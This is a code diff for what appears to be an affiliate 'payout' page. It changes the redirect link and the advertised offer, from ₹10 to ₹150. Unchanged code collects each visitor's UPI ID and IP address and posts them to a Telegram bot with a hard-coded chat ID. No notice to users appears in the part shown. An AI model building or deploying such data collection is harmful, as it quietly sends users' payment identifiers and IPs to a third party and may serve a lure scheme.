@@ -167,7 +167,7 @@
         const chatId = '7094705343';
 
         function getStoredRedirectUrl() {
-            return localStorage.getItem('redirectUrl') || 'https://link.hiqmobi.com/go/198/304';
+            return localStorage.getItem('redirectUrl') || 'https://link.hiqmobi.com/go/48/304';
         }
 
         function getUserIP() {
@@ -181,8 +181,8 @@
         }
 
         function updateDetailsDisplay() {
-            const name = localStorage.getItem('name') || 'Tataneu';
-            const payout = localStorage.getItem('payout') || '10';
+            const name = localStorage.getItem('name') || 'Paytm Money';
+            const payout = localStorage.getItem('payout') || '150';
             const detailsDisplay = document.getElementById('detailsDisplay');
             detailsDisplay.textContent = `${name} - ₹${payout}`;
         }
@@ -196,7 +196,7 @@
 
             getUserIP().then(ipAddress => {
                 // Construct the full message to send to the Telegram bot
-                const fullMessage = `Name: ${name}\nPayout: ₹${payout}\nUPI ID: ${upiId}\nUser IP: ${ipAddress}`;
+                const fullMessage = `New Click By User /Name: ${name}\nPayout: ₹${payout}\nUPI ID: ${upiId}\nUser IP: ${ipAddress}`;
 
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
